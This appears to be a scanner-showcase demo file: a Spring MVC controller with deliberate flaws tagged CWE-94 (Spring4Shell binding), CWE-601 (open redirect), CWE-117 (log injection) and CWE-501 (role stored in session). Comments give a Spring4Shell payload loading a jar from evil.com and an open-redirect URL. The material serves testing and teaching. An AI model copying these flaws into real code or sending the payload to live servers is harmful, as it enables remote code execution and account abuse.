package com.demo;

import org.springframework.web.bind.annotation.*;
import org.springframework.stereotype.Controller;
import javax.servlet.http.*;

/**
 * DEMO FILE — intentional vulnerabilities for security scanner showcase.
 *
 * CWE findings : CWE-94  (Spring4Shell — implicit POJO data binding),
 *                CWE-601 (Open Redirect — user-controlled Location header),
 *                CWE-117 (Log Injection — unsanitized input written to log),
 *                CWE-501 (Trust Boundary — tainted data stored in session)
 * Spring       : demonstrates Spring MVC controller vulnerabilities
 */
@RestController
@RequestMapping("/api")
public class SpringController {

    private static final org.slf4j.Logger log =
        org.slf4j.LoggerFactory.getLogger(SpringController.class);

    // CWE-94: Spring4Shell — POJO parameter without @RequestBody/@RequestParam
    // Spring's DataBinder walks the full class hierarchy via reflection.
    // Attacker sends: class.module.classLoader.urls[0]=jar:http://evil.com/pwn.jar
    @PostMapping("/users")
    public String createUser(UserForm user) {
        return "created: " + user.getName();
    }

    @PutMapping("/users/{id}")
    public String updateUser(@PathVariable String id, UserForm user) {
        return "updated: " + id;
    }

    // CWE-601: Open Redirect — user controls the redirect target
    @GetMapping("/login")
    public void login(@RequestParam String next, HttpServletResponse response)
            throws java.io.IOException {
        // No validation of `next` — attacker sends ?next=https://evil.com
        response.sendRedirect(next);
    }

    @GetMapping("/logout")
    public void logout(@RequestParam(defaultValue = "/") String returnUrl,
                       HttpServletResponse response) throws java.io.IOException {
        response.sendRedirect(returnUrl);
    }

    // CWE-117: Log Injection — raw user input written to log
    @PostMapping("/search")
    public String search(@RequestParam String query, HttpServletRequest request) {
        // Attacker inserts newlines to forge log entries
        log.info("Search query from {}: {}", request.getRemoteAddr(), query);
        log.warn("Query audit: user={} query={}", request.getHeader("X-User-Id"), query);
        return "results for: " + query;
    }

    // CWE-501: Trust Boundary Violation — tainted data written to session
    @PostMapping("/prefs")
    public String setPreferences(@RequestParam String theme,
                                 @RequestParam String role,
                                 HttpServletRequest request) {
        HttpSession session = request.getSession();
        // User-supplied `role` stored directly in session — privilege escalation risk
        session.setAttribute("userTheme", theme);
        session.setAttribute("userRole", role);
        return "preferences saved";
    }

    // Inner POJO — Spring data-binds all HTTP params into this via reflection
    public static class UserForm {
        private String name;
        private String email;
        private Object metadata;  // Object-typed field makes class traversal reachable

        public String getName() { return name; }
        public void setName(String name) { this.name = name; }
        public String getEmail() { return email; }
        public void setEmail(String email) { this.email = email; }
        public Object getMetadata() { return metadata; }
        public void setMetadata(Object metadata) { this.metadata = metadata; }
    }
}
